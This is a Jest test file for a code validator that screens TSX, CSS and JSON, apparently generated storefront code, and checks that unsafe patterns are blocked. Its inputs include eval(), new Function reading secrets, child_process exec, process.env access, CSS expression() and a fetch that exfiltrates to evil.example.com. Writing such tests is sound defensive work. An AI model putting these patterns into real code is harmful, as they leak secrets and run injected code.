import { validateCode } from '../guards/code-validator';
import { DEFAULT_CONFIG } from '../guards/types';

describe('CodeValidator — TSX', () => {
  test('blocks eval() in TSX', () => {
    const code = `export function Component() { eval("bad code"); return <div/>; }`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(true);
    expect(result.threats[0].type).toBe('code_injection');
  });

  test('blocks new Function() in TSX', () => {
    const code = `const fn = new Function('return process.env.SECRET');`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(true);
  });

  test('blocks dangerouslySetInnerHTML', () => {
    const code = `return <div dangerouslySetInnerHTML={{ __html: userInput }} />;`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(true);
  });

  test('blocks child_process import', () => {
    const code = `import { exec } from 'child_process';`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(true);
  });

  test('blocks fetch to non-whitelisted URL', () => {
    const code = `fetch('https://evil.example.com/steal?data=x')`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(true);
  });

  test('allows fetch to whitelisted CDN', () => {
    const code = `fetch('https://fonts.googleapis.com/css2?family=Roboto')`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(false);
  });

  test('allows relative fetch', () => {
    const code = `fetch('/api/products')`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(false);
  });

  test('blocks process.env access', () => {
    const code = `const key = process.env.SECRET_KEY;`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(true);
  });

  test('passes clean React component', () => {
    const code = `
import React from 'react';
export default function Hero() {
  return (
    <section className="bg-blue-900 text-white p-8">
      <h1>Welcome to our store</h1>
    </section>
  );
}`;
    const result = validateCode(code, 'tsx', DEFAULT_CONFIG);
    expect(result.blocked).toBe(false);
    expect(result.passed).toBe(true);
  });
});

describe('CodeValidator — CSS', () => {
  test('blocks CSS expression()', () => {
    const css = `div { width: expression(document.body.clientWidth); }`;
    const result = validateCode(css, 'css', DEFAULT_CONFIG);
    expect(result.blocked).toBe(true);
  });

  test('passes clean CSS', () => {
    const css = `.hero { background: #003366; color: white; font-family: sans-serif; }`;
    const result = validateCode(css, 'css', DEFAULT_CONFIG);
    expect(result.blocked).toBe(false);
    expect(result.passed).toBe(true);
  });
});

describe('CodeValidator — JSON', () => {
  test('passes valid JSON', () => {
    const json = JSON.stringify({ name: 'Test Store', colors: { primary: '#003366' } });
    const result = validateCode(json, 'json', DEFAULT_CONFIG);
    expect(result.blocked).toBe(false);
  });

  test('detects invalid JSON', () => {
    const json = `{ name: 'Test Store', }`;
    const result = validateCode(json, 'json', DEFAULT_CONFIG);
    expect(result.threats.some(t => t.type === 'code_injection')).toBe(true);
  });
});
